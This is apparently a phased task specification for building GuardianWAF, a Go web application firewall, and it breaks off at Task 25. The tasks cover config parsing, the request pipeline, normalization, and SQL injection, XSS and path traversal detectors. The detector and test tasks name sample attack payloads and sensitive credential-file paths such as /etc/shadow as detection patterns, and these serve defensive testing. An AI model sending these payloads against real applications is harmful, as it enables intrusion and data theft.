# GuardianWAF — Implementation Tasks

**Author:** Ersin Koç / ECOSTACK TECHNOLOGY OÜ
**Module:** `github.com/guardianwaf/guardianwaf`
**Complexity:** S = few hours | M = half day | L = full day | XL = multi-day

> Tasks are ordered. Each task lists dependencies where applicable.
> All file paths are relative to repository root (`guardianwaf/`).

---

## Phase 1: Foundation (Tasks 1–12)

### Task 1: Project Scaffolding [S]

**Files:** `go.mod`, `Makefile`, `.golangci.yml`, `.goreleaser.yml`, `.gitignore`

**Description:**
Initialize the Go module as `github.com/guardianwaf/guardianwaf`. Create the directory skeleton matching the full project layout (all directories, empty `.gitkeep` where needed). The `Makefile` must include targets: `build`, `test`, `lint`, `bench`, `fuzz`, `clean`, `run`, `docker-build`. `.golangci.yml` enables linters: `govet`, `staticcheck`, `errcheck`, `gosimple`, `ineffassign`, `unused`, `misspell`, `gofumpt`, `revive`, `gocritic`. `.goreleaser.yml` defines builds for `linux/amd64`, `linux/arm64`, `darwin/amd64`, `darwin/arm64`, `windows/amd64` with the binary name `guardianwaf` from `cmd/guardianwaf`. `.gitignore` covers Go binaries, `dist/`, IDE files, `.env`.

**Acceptance Criteria:**
- [ ] `go mod tidy` succeeds with no errors
- [ ] `make build` compiles (even if main.go is a stub)
- [ ] All directories from the project structure exist
- [ ] `.golangci.yml` is valid YAML with at least 10 linters enabled
- [ ] `.goreleaser.yml` targets 5 OS/arch combos
- [ ] `cmd/guardianwaf/main.go` exists as a compilable stub (`package main` + empty `func main()`)

---

### Task 2: Custom YAML Parser (Subset) [L]

**Files:** `internal/config/yaml.go`, `internal/config/yaml_test.go`

**Description:**
Implement a zero-dependency YAML subset parser. Must handle: string values (plain, single-quoted, double-quoted), integers, floats, booleans (`true`/`false`/`yes`/`no`/`on`/`off`), null, comments (`#`), nested maps (indentation-based, 2-space), sequences (both block `- item` and flow `[a, b]`), multi-line strings (literal `|` and folded `>`), and inline maps `{key: val}`. Parser reads `[]byte` and returns a `Node` tree. Provide `Node` methods: `String()`, `Int()`, `Float64()`, `Bool()`, `Slice()`, `Map()`, `Get(key string) *Node`. Handle edge cases: trailing whitespace, empty values, deeply nested structures (up to 10 levels), UTF-8 content. Do NOT support anchors, aliases, tags, or multi-document streams.

**Acceptance Criteria:**
- [ ] Parses nested maps 5+ levels deep
- [ ] Parses block sequences and flow sequences
- [ ] Handles all scalar types (string, int, float, bool, null)
- [ ] Handles quoted strings with escape sequences
- [ ] Handles literal and folded block scalars
- [ ] Ignores comments correctly
- [ ] Returns clear errors with line numbers on malformed input
- [ ] Minimum 20 test cases covering all features
- [ ] Zero external dependencies
- [ ] All tests pass

---

### Task 3: Configuration Structs and Defaults [M]

**Files:** `internal/config/config.go`, `internal/config/defaults.go`

**Dependencies:** Task 2

**Description:**
Define all configuration structs that mirror the YAML configuration schema. Top-level struct `Config` with nested structs: `ServerConfig` (listen address, ports, TLS, timeouts), `EngineConfig` (mode, threshold, paranoia level 1–4, allowed methods, max body/url/header sizes), `DetectionConfig` (per-detector enable/disable + score multipliers for sqli, xss, lfi, cmdi, xxe, ssrf), `RateLimitConfig` (rules with scope, requests, window, burst, ban duration), `IPACLConfig` (whitelist, blacklist, auto-ban), `BotDetectConfig` (JA3 enable, UA enable, behavior enable, thresholds), `ProxyConfig` (backends list with weight, health check interval, circuit breaker settings, websocket enable), `DashboardConfig` (enable, listen, API keys, auth), `MCPConfig` (enable), `ResponseConfig` (security headers map, masking enable, error page mode), `LogConfig` (level, format, output), `EventsConfig` (store type, file path, buffer size). Implement `DefaultConfig()` returning production-safe defaults: threshold 10, paranoia 2, rate limit 100 req/10s, all detectors enabled with multiplier 1.0.

**Acceptance Criteria:**
- [ ] All config sections represented as typed Go structs
- [ ] `DefaultConfig()` returns a fully populated config
- [ ] Default threshold is 10, default paranoia level is 2
- [ ] All detectors enabled by default with multiplier 1.0
- [ ] Default rate limit: 100 requests per 10 seconds
- [ ] Struct fields have descriptive names (no abbreviations)
- [ ] All numeric fields use appropriate types (int, float64, time.Duration)

---

### Task 4: Configuration Loading and Validation [M]

**Files:** `internal/config/validate.go`

**Dependencies:** Task 2, Task 3

**Description:**
Implement `LoadFile(path string) (*Config, error)` that reads a YAML file via the custom parser and populates `Config`. Implement `LoadEnv(cfg *Config)` that reads environment variables with prefix `GUARDIAN_` (e.g., `GUARDIAN_LISTEN=:9090`, `GUARDIAN_THRESHOLD=15`, `GUARDIAN_PARANOIA=3`). Env vars override file values. Implement `Validate(cfg *Config) error` that checks: port ranges (1–65535), threshold > 0, paranoia 1–4, rate limit values > 0, valid IP/CIDR in whitelist/blacklist, non-empty backend URLs in proxy mode, valid log levels, timeouts > 0. Return aggregated validation errors (not just the first one) with field paths (e.g., `engine.threshold: must be > 0`).

**Acceptance Criteria:**
- [ ] `LoadFile` reads YAML and returns populated Config
- [ ] `LoadEnv` overrides config values from environment variables
- [ ] `Validate` checks all numeric ranges and returns aggregated errors
- [ ] Validation errors include field paths for debugging
- [ ] Invalid CIDR notation is rejected
- [ ] Empty required fields are flagged
- [ ] All tests pass

---

### Task 5: Layer Interface Definition [S]

**Files:** `internal/engine/layer.go`

**Description:**
Define the `Layer` interface that all WAF processing layers implement. Interface: `Layer` with methods `Name() string`, `Process(ctx *RequestContext) LayerResult`. Define `LayerResult` struct: `Action` (enum: `ActionPass`, `ActionBlock`, `ActionLog`, `ActionChallenge`), `Findings []Finding`, `Score int`, `Duration time.Duration`. Define `Detector` interface extending Layer with `DetectorName() string` and `Patterns() []string` for introspection. Define `LayerOrder` constants for execution order: `OrderIPACL = 100`, `OrderRateLimit = 200`, `OrderSanitizer = 300`, `OrderDetection = 400`, `OrderBotDetect = 500`, `OrderResponse = 600`.

**Acceptance Criteria:**
- [ ] `Layer` interface defined with `Name()` and `Process()` methods
- [ ] `LayerResult` struct contains Action, Findings, Score, Duration
- [ ] Action constants defined: Pass, Block, Log, Challenge
- [ ] `Detector` interface extends Layer with introspection methods
- [ ] `LayerOrder` constants defined for all 6 layer types
- [ ] All types are exported and well-documented with Go doc comments

---

### Task 6: Finding and Scoring Structs [S]

**Files:** `internal/engine/finding.go`

**Description:**
Define the `Finding` struct representing a single detection result: `DetectorName string`, `Category string` (sqli/xss/lfi/cmdi/xxe/ssrf/bot/ratelimit/ipacl), `Severity` (enum: Info, Low, Medium, High, Critical), `Score int`, `Description string`, `MatchedValue string` (the input fragment that triggered detection), `Location string` (query/body/header/cookie/path/uri), `Confidence float64` (0.0–1.0). Implement `ScoreAccumulator` struct: `Add(f Finding)`, `Total() int`, `Exceeds(threshold int) bool`, `Findings() []Finding`, `HighestSeverity() Severity`. Score accumulation applies paranoia multiplier: paranoia 1 = 0.5x, 2 = 1.0x, 3 = 1.5x, 4 = 2.0x.

**Acceptance Criteria:**
- [ ] `Finding` struct has all specified fields
- [ ] `Severity` type with 5 levels and `String()` method
- [ ] `ScoreAccumulator` correctly sums scores
- [ ] Paranoia multiplier applied during `Total()` calculation
- [ ] `Exceeds()` compares accumulated score against threshold
- [ ] `HighestSeverity()` returns the maximum severity from all findings
- [ ] All tests pass

---

### Task 7: RequestContext [M]

**Files:** `internal/engine/context.go`

**Description:**
Define `RequestContext` struct that carries all per-request state through the pipeline. Fields: `Request *http.Request`, `ClientIP net.IP`, `Path string` (normalized), `QueryParams map[string][]string`, `Headers map[string][]string`, `Cookies map[string]string`, `Body []byte`, `BodyString string`, `ContentType string`, `Method string`, `URI string`, `Accumulator *ScoreAccumulator`, `Findings []Finding`, `Action Action`, `Metadata map[string]interface{}`, `StartTime time.Time`, `RequestID string`. Implement `NewRequestContext(r *http.Request, cfg *config.Config) *RequestContext` that extracts and populates all fields. Use `sync.Pool` for allocation. Implement `Pool` with `Get(r *http.Request, cfg *config.Config) *RequestContext` and `Put(ctx *RequestContext)` that resets fields before returning to pool. Parse `X-Forwarded-For` and `X-Real-IP` for client IP extraction with configurable trust.

**Acceptance Criteria:**
- [ ] All specified fields present on RequestContext
- [ ] `NewRequestContext` correctly populates from `*http.Request`
- [ ] Client IP extraction handles X-Forwarded-For, X-Real-IP, RemoteAddr
- [ ] `sync.Pool` integration with Get/Put lifecycle
- [ ] Put resets all fields to zero values before pooling
- [ ] Body reading respects max body size from config
- [ ] RequestID generated as UUID v4 (hand-implemented, no deps)
- [ ] All tests pass

---

### Task 8: Event System [M]

**Files:** `internal/events/store.go`, `internal/events/memory.go`, `internal/engine/event.go`

**Dependencies:** Task 6, Task 7

**Description:**
Define `Event` struct in engine package: `ID string`, `Timestamp time.Time`, `RequestID string`, `ClientIP string`, `Method string`, `Path string`, `Action Action`, `Score int`, `Findings []Finding`, `Duration time.Duration`, `StatusCode int`, `UserAgent string`, `Country string`. Define `EventStore` interface: `Store(event Event) error`, `Query(filter EventFilter) ([]Event, error)`, `Count(filter EventFilter) (int, error)`, `Recent(n int) ([]Event, error)`. Implement `MemoryStore` backed by a ring buffer with configurable capacity (default 10000). Ring buffer overwrites oldest entries when full. `EventFilter` supports: time range, client IP, action type, minimum score, path prefix, limit/offset. Implement `EventBus` with pub/sub: `Subscribe(ch chan<- Event)`, `Unsubscribe(ch chan<- Event)`, `Publish(event Event)`. Publish is non-blocking (skip slow subscribers).

**Acceptance Criteria:**
- [ ] `Event` struct has all specified fields
- [ ] `EventStore` interface defined with Store, Query, Count, Recent
- [ ] `MemoryStore` uses ring buffer with configurable capacity
- [ ] Ring buffer correctly overwrites oldest entries
- [ ] `EventFilter` supports all specified filter criteria
- [ ] `EventBus` pub/sub works with multiple subscribers
- [ ] Publish does not block on slow subscribers
- [ ] All tests pass

---

### Task 9: Event File Store [S]

**Files:** `internal/events/file.go`

**Dependencies:** Task 8

**Description:**
Implement `FileStore` that writes events as JSONL (one JSON object per line) to a file. Use a buffered channel (capacity 1024) to decouple callers from disk I/O. A background goroutine reads from the channel and writes to the file using `bufio.Writer` with periodic flush (every 1 second or every 100 events, whichever comes first). Implement manual JSON marshaling for `Event` (no `encoding/json` import — write the JSON string builder by hand to maintain zero-dep). Handle file rotation: when file exceeds configured max size (default 100MB), rename to `events-{timestamp}.jsonl` and start new file. Implement graceful shutdown via `Close()` that drains the channel and flushes.

**Acceptance Criteria:**
- [ ] Events written as valid JSONL (one JSON object per line)
- [ ] Buffered channel decouples callers from I/O
- [ ] Background goroutine flushes periodically
- [ ] Manual JSON marshaling (no encoding/json)
- [ ] File rotation at configurable size threshold
- [ ] `Close()` drains channel and flushes remaining events
- [ ] No data loss on graceful shutdown
- [ ] All tests pass

---

### Task 10: Pipeline Composition [M]

**Files:** `internal/engine/pipeline.go`

**Dependencies:** Task 5, Task 6, Task 7

**Description:**
Implement `Pipeline` struct that holds an ordered list of `Layer` instances. `NewPipeline(layers ...Layer) *Pipeline` sorts layers by their `LayerOrder`. `Execute(ctx *RequestContext) PipelineResult` runs each layer in order. If any layer returns `ActionBlock`, execution stops immediately (early return) and the block action is recorded. If a layer returns `ActionLog`, execution continues but findings are accumulated. `PipelineResult` contains: final `Action`, all `Findings`, total `Score`, per-layer `Duration` map, total `Duration`. Support layer exclusions: `Pipeline.SetExclusions(paths []string, detectors []string)` skips specified detectors for matching path prefixes. Thread-safe for concurrent use.

**Acceptance Criteria:**
- [ ] Layers execute in order defined by LayerOrder constants
- [ ] Early return on ActionBlock
- [ ] Findings accumulated across all layers
- [ ] Score correctly summed from all layer results
- [ ] Per-layer timing recorded
- [ ] Path-based exclusions skip specified detectors
- [ ] Thread-safe for concurrent requests
- [ ] All tests pass

---

### Task 11: Engine Struct [M]

**Files:** `internal/engine/engine.go`

**Dependencies:** Task 3, Task 7, Task 8, Task 10

**Description:**
Implement the core `Engine` struct that ties everything together. `NewEngine(cfg *config.Config) (*Engine, error)` creates the engine, initializes the pipeline with configured layers, sets up the event store and event bus. `Engine.Check(r *http.Request) (*Event, error)` is the main entry point: gets a `RequestContext` from pool, runs the pipeline, creates an `Event` from the result, stores/publishes the event, returns the context to the pool. `Engine.Middleware() func(http.Handler) http.Handler` returns standard Go middleware that calls `Check()` and either passes to next handler or returns a block response. `Engine.Reload(cfg *config.Config) error` hot-reloads configuration (swap pipeline atomically with `atomic.Value`). Expose `Engine.Stats()` returning request count, block count, avg latency.

**Acceptance Criteria:**
- [ ] `NewEngine` creates fully initialized engine from config
- [ ] `Check()` processes a request through the full pipeline
- [ ] `Check()` returns an Event with all fields populated
- [ ] `Middleware()` returns standard `func(http.Handler) http.Handler`
- [ ] Middleware blocks requests exceeding threshold
- [ ] `Reload()` swaps pipeline atomically without dropping requests
- [ ] `Stats()` returns accurate request/block counts
- [ ] Context pool used for allocation/deallocation
- [ ] All tests pass

---

### Task 12: Engine Tests [M]

**Files:** `internal/engine/engine_test.go`

**Dependencies:** Task 11

**Description:**
Write comprehensive tests for the engine. Create mock layers: `PassLayer` (always passes, score 0), `ScoreLayer` (returns configurable score), `BlockLayer` (always blocks), `SlowLayer` (adds latency for timing tests). Test cases: single pass-through, single block, score accumulation below threshold, score accumulation above threshold, early return on block, layer ordering, exclusion paths, middleware integration with `httptest`, concurrent request handling (100 goroutines), config reload during traffic, event store population, event bus notification. Use table-driven tests where appropriate.

**Acceptance Criteria:**
- [ ] Mock layers implemented for testing
- [ ] Test: request passes when score below threshold
- [ ] Test: request blocked when score exceeds threshold
- [ ] Test: early return on block layer
- [ ] Test: correct layer execution order
- [ ] Test: path exclusions work
- [ ] Test: middleware returns 403 on block
- [ ] Test: concurrent access (100 goroutines, no race)
- [ ] Test: config reload is atomic
- [ ] Test: events stored and published
- [ ] `go test -race` passes
- [ ] All tests pass

---

## Phase 2: Core Detection (Tasks 13–30)

### Task 13: Request Sanitizer — Normalization Module [L]

**Files:** `internal/layers/sanitizer/normalize.go`, `internal/layers/sanitizer/normalize_test.go`

**Dependencies:** Task 5

**Description:**
Implement all input normalization functions used before detection. Each function takes a string and returns a normalized string. Functions: `DecodeURLRecursive(s string) string` — repeatedly URL-decodes until stable (max 5 iterations to prevent infinite loops), handling `%XX` and `%uXXXX`. `RemoveNullBytes(s string) string` — strips `\x00`, `%00`, `\0`. `CanonicalizePath(s string) string` — resolves `../`, `./`, `//`, decodes path components. `NormalizeUnicode(s string) string` — NFC normalization (hand-implemented for ASCII + common attack characters; map confusable Unicode to ASCII equivalents like fullwidth to ASCII). `DecodeHTMLEntities(s string) string` — decode `&amp;`, `&lt;`, `&gt;`, `&quot;`, `&#xNN;`, `&#NNN;` (named + numeric + hex). `NormalizeCase(s string) string` — lowercase for detection comparison. `NormalizeWhitespace(s string) string` — collapse runs of whitespace/control chars to single space, trim. `NormalizeBackslashes(s string) string` — convert `\` to `/` for path comparison. Implement `NormalizeAll(s string) string` that chains all functions in the correct order.

**Acceptance Criteria:**
- [ ] Recursive URL decode with max iteration guard
- [ ] Null byte removal from all encodings (%00, \x00, \0)
- [ ] Path canonicalization resolves traversal sequences
- [ ] Unicode confusable mapping (fullwidth letters, etc.)
- [ ] HTML entity decoding (named, decimal, hex)
- [ ] Case normalization to lowercase
- [ ] Whitespace collapsing and trimming
- [ ] Backslash-to-forward-slash normalization
- [ ] `NormalizeAll` chains in correct order
- [ ] Minimum 25 test cases
- [ ] All tests pass

---

### Task 14: Request Validator [M]

**Files:** `internal/layers/sanitizer/validate.go`

**Dependencies:** Task 3, Task 5

**Description:**
Implement request validation that enforces structural limits before detection runs. `ValidateRequest(ctx *RequestContext, cfg *config.Config) []Finding`. Checks: URL length (default max 2048), total header size (default max 8KB), header count (default max 50), individual header value size (default max 4KB), body size (default max 1MB), cookie count (default max 50), individual cookie size (default max 4KB), allowed HTTP methods (default: GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS), allowed content types (default: application/x-www-form-urlencoded, multipart/form-data, application/json, text/plain, text/xml), hop-by-hop header stripping (remove Connection, Keep-Alive, Proxy-Authenticate, Proxy-Authorization, TE, Trailer, Transfer-Encoding from forwarded requests). Each violation produces a Finding with appropriate severity (High for body/URL oversized, Medium for header violations, Low for method violations).

**Acceptance Criteria:**
- [ ] URL length enforcement with configurable max
- [ ] Header size and count validation
- [ ] Body size validation
- [ ] Cookie size and count validation
- [ ] HTTP method whitelist check
- [ ] Content-Type whitelist check
- [ ] Hop-by-hop header stripping
- [ ] Each violation produces a Finding with correct severity
- [ ] All limits configurable via Config
- [ ] All tests pass

---

### Task 15: Sanitizer Layer Integration [M]

**Files:** `internal/layers/sanitizer/sanitizer.go`, `internal/layers/sanitizer/sanitizer_test.go`

**Dependencies:** Task 13, Task 14

**Description:**
Implement `SanitizerLayer` that combines normalization and validation as a single `Layer`. On `Process()`: first run all normalizations on the RequestContext fields (Path, QueryParams values, Headers values, Cookies values, Body), updating the context with normalized values. Then run validation checks. Return findings from validation. Support per-path override configuration: certain paths can have different max body sizes (e.g., file upload endpoints) or skip certain normalizations. The layer always returns `ActionPass` (normalization never blocks) but may produce findings from validation that contribute to the overall score.

**Acceptance Criteria:**
- [ ] Implements `Layer` interface with `Name()` returning "sanitizer"
- [ ] Normalizes all RequestContext string fields
- [ ] Runs validation and returns findings
- [ ] Per-path configuration overrides supported
- [ ] Layer always returns ActionPass (findings only)
- [ ] Context fields updated in-place with normalized values
- [ ] Subsequent layers see normalized data
- [ ] All tests pass

---

### Task 16: Sanitizer Tests [M]

**Files:** `internal/layers/sanitizer/sanitizer_test.go` (extend), `internal/layers/sanitizer/normalize_test.go` (extend)

**Dependencies:** Task 15

**Description:**
Comprehensive test suite for the sanitizer layer. Normalization tests: double-encoded URLs (`%2527` to `'`), triple-encoded sequences, null bytes in various encodings, path traversal (`../../../../etc/passwd`), Unicode fullwidth (`%EF%BC%B3ELECT`), HTML entities (named + numeric), mixed-case evasion (`SeLeCt`), whitespace injection (`SEL/**/ECT`), backslash paths (`..\\..\\etc\\passwd`). Validation tests: oversized URL, too many headers, oversized body, disallowed method (TRACE), invalid content-type, hop-by-hop headers present. Integration tests: full request through SanitizerLayer with mock RequestContext. Edge cases: empty body, no headers, zero-length URL.

**Acceptance Criteria:**
- [ ] Tests cover every normalization function individually
- [ ] Tests cover double and triple encoding
- [ ] Tests cover Unicode evasion attempts
- [ ] Tests cover all validation rules
- [ ] Tests cover per-path overrides
- [ ] Edge cases tested (empty inputs, max boundary values)
- [ ] Minimum 30 test cases total
- [ ] All tests pass

---

### Task 17: SQL Tokenizer [XL]

**Files:** `internal/layers/detection/sqli/tokenizer.go`

**Dependencies:** Task 5

**Description:**
Hand-written lexer for SQL fragment tokenization. The tokenizer scans arbitrary input strings (not just valid SQL) and emits a stream of tokens. Token types: `TokenKeyword`, `TokenFunction`, `TokenOperator`, `TokenString` (single-quoted), `TokenNumber`, `TokenIdentifier`, `TokenComment` (both `--` and `/* */`), `TokenParenOpen`, `TokenParenClose`, `TokenComma`, `TokenSemicolon`, `TokenDot`, `TokenWildcard` (`*`), `TokenWhitespace`, `TokenUnknown`. The tokenizer must handle: nested comments, string escaping (single quote doubled `''`, backslash-escaped `\'`), hex literals (`0xDEAD`), backtick-quoted identifiers, double-quoted identifiers, MySQL-style `/*!` conditional comments, numeric literals (int, float, scientific notation), operators (`=`, `<>`, `!=`, `<=`, `>=`, `<`, `>`, `||`, `&&`, `LIKE`, `IN`, `BETWEEN`, `AND`, `OR`, `NOT`, `UNION`, `IS`). Implement `Tokenize(input string) []Token` and `Token` struct with `Type`, `Value`, `Position`. The tokenizer must be fast — target less than 1 microsecond for typical 100-char inputs.

**Acceptance Criteria:**
- [ ] All token types defined and recognized
- [ ] Single-quoted strings with escape handling
- [ ] Double-quoted identifiers
- [ ] Backtick-quoted identifiers
- [ ] Block comments (`/* */`) including nested
- [ ] Line comments (`--`)
- [ ] MySQL conditional comments (`/*! */`)
- [ ] Hex literals recognized
- [ ] Scientific notation recognized
- [ ] All SQL operators tokenized
- [ ] Position tracking for each token
- [ ] Performance: less than 1 microsecond for 100-char input
- [ ] All tests pass

---

### Task 18: SQL Keyword and Function Database [M]

**Files:** `internal/layers/detection/sqli/keywords.go`

**Dependencies:** Task 17

**Description:**
Implement a trie-based keyword lookup for SQL keywords and functions. Build a compact trie at init time (not runtime per-request). Keywords include all SQL standard keywords: `SELECT`, `INSERT`, `UPDATE`, `DELETE`, `DROP`, `ALTER`, `CREATE`, `UNION`, `FROM`, `WHERE`, `JOIN`, `HAVING`, `GROUP BY`, `ORDER BY`, `LIMIT`, `OFFSET`, `INTO`, `VALUES`, `SET`, `TABLE`, `DATABASE`, `EXEC`, `EXECUTE`, `DECLARE`, `CAST`, `CONVERT`, `CASE`, `WHEN`, `THEN`, `ELSE`, `END`, `IF`, `WHILE`, `WAITFOR`, `DELAY`, `BENCHMARK`, `SLEEP`, `LOAD_FILE`, `OUTFILE`, `DUMPFILE`. Functions: `CONCAT`, `SUBSTR`, `SUBSTRING`, `LENGTH`, `CHAR`, `CHR`, `ASCII`, `HEX`, `UNHEX`, `MD5`, `SHA1`, `VERSION`, `USER`, `DATABASE`, `CURRENT_USER`, `SYSTEM_USER`, `@@VERSION`, `INFORMATION_SCHEMA`. Categorize each keyword with a risk level (high: `UNION`, `EXEC`, `DROP`, `LOAD_FILE`, `OUTFILE`, `WAITFOR`; medium: `SELECT`, `INSERT`, `DELETE`, `UPDATE`; low: `FROM`, `WHERE`, `AND`). `Lookup(word string) (keyword *Keyword, found bool)`.

**Acceptance Criteria:**
- [ ] Trie built at init time, not per-request
- [ ] Case-insensitive lookup
- [ ] All standard SQL keywords included (40+)
- [ ] All common SQL functions included (20+)
- [ ] Each keyword has an assigned risk level
- [ ] `Lookup()` returns in O(k) time where k is word length
- [ ] Trie supports prefix matching for partial token analysis
- [ ] All tests pass

---

### Task 19: SQLi Pattern Matching and Scoring [L]

**Files:** `internal/layers/detection/sqli/sqli.go`, `internal/layers/detection/sqli/patterns.go`

**Dependencies:** Task 17, Task 18

**Description:**
Implement the SQL injection detector. `SQLiDetector` implements the `Detector` interface. On `Process()`, scan all input locations: query parameter values, cookie values, header values (Referer, User-Agent, X-Forwarded-For), request body (form values and JSON string values), URL path segments. For each location: tokenize the input, then apply pattern rules. Pattern rules with scores: `UNION SELECT` (score 8), `OR 1=1` / tautology patterns (score 7), comment sequences after keywords (score 5), stacked queries via semicolon (score 6), `WAITFOR DELAY` / `BENCHMARK` / `SLEEP` time-based patterns (score 9), `INTO OUTFILE` / `LOAD_FILE` file operations (score 9), string concatenation obfuscation like `CONCAT(CHAR(...))` (score 6), hex-encoded strings following keywords (score 5), always-true conditions `'a'='a'` (score 7), `INFORMATION_SCHEMA` access (score 8), `@@version` / `USER()` info disclosure (score 6). Apply detection across all locations with location-specific multipliers (query params 1.0x, headers 0.8x, cookies 0.9x, body 1.0x, path 1.2x). Return the highest-scoring finding per location.

**Acceptance Criteria:**
- [ ] Implements `Detector` interface
- [ ] Scans all input locations (query, headers, cookies, body, path)
- [ ] Tokenizer-based pattern matching (not regex)
- [ ] All pattern rules defined with scores
- [ ] Location-specific score multipliers applied
- [ ] Returns findings with matched value and location
- [ ] Confidence value calculated based on pattern specificity
- [ ] Handles obfuscation (comments, encoding, case variation)
- [ ] All tests pass

---

### Task 20: SQLi Tests [L]

**Files:** `internal/layers/detection/sqli/sqli_test.go`, `internal/layers/detection/sqli/testdata/`

**Dependencies:** Task 19

**Description:**
Comprehensive test suite for SQLi detection. Create test data files: `testdata/attacks.txt` (one payload per line, minimum 50 attack payloads), `testdata/benign.txt` (minimum 50 benign inputs that should NOT trigger). Attack payloads must cover: classic UNION-based (`' UNION SELECT 1,2,3--`), error-based (`' AND 1=CONVERT(int,@@version)--`), blind boolean (`' AND 1=1--` vs `' AND 1=2--`), time-based blind (`'; WAITFOR DELAY '0:0:5'--`), stacked queries (`'; DROP TABLE users--`), comment obfuscation (`UN/**/ION SE/**/LECT`), case variation (`uNiOn SeLeCt`), encoding evasion (`%27%20UNION%20SELECT`), nested functions (`CONCAT(CHAR(117),CHAR(110))`), second-order patterns. Benign inputs must include: normal English text with SQL-like words ("select the best option from the menu"), mathematical expressions, URLs with query parameters, JSON payloads, form data. Test false positive rate must be less than 1%. Table-driven tests with expected score ranges.

**Acceptance Criteria:**
- [ ] Minimum 50 attack payloads tested with expected detection
- [ ] Minimum 50 benign inputs tested with no false positives
- [ ] Attack payloads cover all major SQLi categories
- [ ] Obfuscation evasion techniques tested
- [ ] False positive rate less than 1% on benign inputs
- [ ] Test data files in testdata/ directory
- [ ] Score ranges validated (not just detect/no-detect)
- [ ] All tests pass

---

### Task 21: XSS HTML Scanner [L]

**Files:** `internal/layers/detection/xss/parser.go`, `internal/layers/detection/xss/xss.go`

**Dependencies:** Task 5

**Description:**
Implement a lightweight HTML/JavaScript scanner for XSS detection. NOT a full HTML parser — a targeted scanner that identifies dangerous constructs. `HTMLScanner` scans input for: opening tags (extract tag name and attributes), closing tags, self-closing tags, event handler attributes (`onload`, `onerror`, `onclick`, `onmouseover`, `onfocus`, `onblur`, etc. — all `on*` attributes), `src`/`href`/`action`/`formaction`/`data` attributes with `javascript:`, `vbscript:`, `data:` URI schemes, `<script>` tags (including variations like `<script/xss>`, `<script\t>`), `<iframe>`, `<object>`, `<embed>`, `<svg>`, `<math>` tags, `<style>` tags with `expression()` or `url()`, HTML comments that might hide content, template injection patterns (`{{`, `${`, `<%`). Implement `Scan(input string) []HTMLToken` where `HTMLToken` has `Type` (Tag, Attribute, Script, Comment, Text), `Name`, `Value`, `Position`, `Risk` (int score).

**Acceptance Criteria:**
- [ ] Detects all HTML tag openings with attribute extraction
- [ ] Identifies all `on*` event handler attributes
- [ ] Detects dangerous URI schemes in src/href attributes
- [ ] Detects script, iframe, object, embed, svg, math tags
- [ ] Handles tag obfuscation (extra spaces, tabs, newlines)
- [ ] Detects CSS expression() in style attributes/tags
- [ ] Detects template injection patterns
- [ ] Position tracking for all tokens
- [ ] Each token has a risk score
- [ ] All tests pass

---

### Task 22: XSS Pattern Matching and Scoring [M]

**Files:** `internal/layers/detection/xss/patterns.go`, `internal/layers/detection/xss/xss.go` (extend)

**Dependencies:** Task 21

**Description:**
Implement `XSSDetector` implementing the `Detector` interface. Scan all input locations with the HTML scanner. Pattern rules with scores: `<script>` tag (score 9), event handler attributes `on*=` (score 8), `javascript:` URI scheme (score 9), `<iframe>` with src (score 7), `<svg onload>` (score 8), `<img onerror>` (score 8), `<body onload>` (score 7), data URI with base64 (score 6), `<style>` with `expression()` (score 7), `document.cookie` access (score 8), `setTimeout()` / `setInterval()` with string arg (score 7), `innerHTML` / `outerHTML` assignment (score 6), `<object>` / `<embed>` tags (score 6), template literals with interpolation (score 5), DOM clobbering patterns (score 5). Apply context-aware scoring: increase score by 2 if payload appears in a reflected context (query param echoed in response). Location multipliers same as SQLi.

**Acceptance Criteria:**
- [ ] Implements `Detector` interface
- [ ] All pattern rules defined with scores
- [ ] Scans all input locations
- [ ] Context-aware scoring for reflected patterns
- [ ] Location multipliers applied
- [ ] Findings include matched value and position
- [ ] Confidence calculated based on construct specificity
- [ ] All tests pass

---

### Task 23: XSS Tests [M]

**Files:** `internal/layers/detection/xss/xss_test.go`, `internal/layers/detection/xss/testdata/`

**Dependencies:** Task 22

**Description:**
Comprehensive test suite for XSS detection. Attack payloads (minimum 40): basic `<script>alert(1)</script>`, event handlers `<img src=x onerror=alert(1)>`, SVG-based `<svg/onload=alert(1)>`, encoded payloads `<img src=x onerror=&#97;lert(1)>`, polyglot payloads, mutation XSS payloads, DOM-based patterns, JavaScript URI `<a href="javascript:alert(1)">`, CSS injection `<div style="background:url(javascript:alert(1))">`, template injection `{{constructor.constructor('alert(1)')()}}`, null-byte injection `<scr%00ipt>`, tag breaking `"><script>`, attribute breaking `' onmouseover='alert(1)`. Benign inputs (minimum 40): HTML emails with safe tags, markdown with angle brackets, mathematical comparisons (`a < b && c > d`), URLs with encoded characters, JSON with HTML-like strings. False positive rate less than 2%.

**Acceptance Criteria:**
- [ ] Minimum 40 attack payloads tested
- [ ] Minimum 40 benign inputs tested
- [ ] Obfuscation and encoding evasion tested
- [ ] Polyglot payloads tested
- [ ] False positive rate less than 2%
- [ ] Test data files in testdata/ directory
- [ ] All tests pass

---

### Task 24: Path Traversal Detector [M]

**Files:** `internal/layers/detection/lfi/lfi.go`, `internal/layers/detection/lfi/sensitive_paths.go`

**Dependencies:** Task 5

**Description:**
Implement `LFIDetector` for Local File Inclusion / Path Traversal detection. Pattern matching: `../` sequences (and encoded variants `%2e%2e%2f`, `..%2f`, `%2e%2e/`, `..%255c`), `..\\` sequences, absolute path references (`/etc/`, `C:\\`, `\\\\`), null byte injection in file paths (`%00`), wrapper schemes (`php://`, `file://`, `zip://`, `expect://`). Sensitive path database in `sensitive_paths.go`: Linux paths (`/etc/passwd`, `/etc/shadow`, `/proc/self/environ`, `/etc/hosts`, `/var/log/`), Windows paths (`C:\\Windows\\system32\\`, `C:\\boot.ini`, `web.config`), macOS paths (`/etc/master.passwd`), application paths (`.env`, `.git/config`, `.htaccess`, `wp-config.php`, `config.yml`, `database.yml`). Score: traversal sequence (5), traversal + sensitive path (8), absolute path to sensitive file (7), null byte in path (9), wrapper scheme (8). Scan URL path and query parameters.

**Acceptance Criteria:**
- [ ] Detects `../` and encoded variants
- [ ] Detects absolute path references
- [ ] Detects null byte injection in paths
- [ ] Detects wrapper schemes
- [ ] Sensitive paths for Linux, Windows, macOS
- [ ] Application-specific sensitive paths included
- [ ] Correct scoring per pattern
- [ ] Implements `Detector` interface
- [ ] All tests pass

---

### Task 25: Path Traversal Tests [M]

**Files:** `internal/layers/detection/lfi/lfi_test.go`, `internal/layers/detection/lfi/testdata/`

**Dependencies:** Task 24

**Description:**
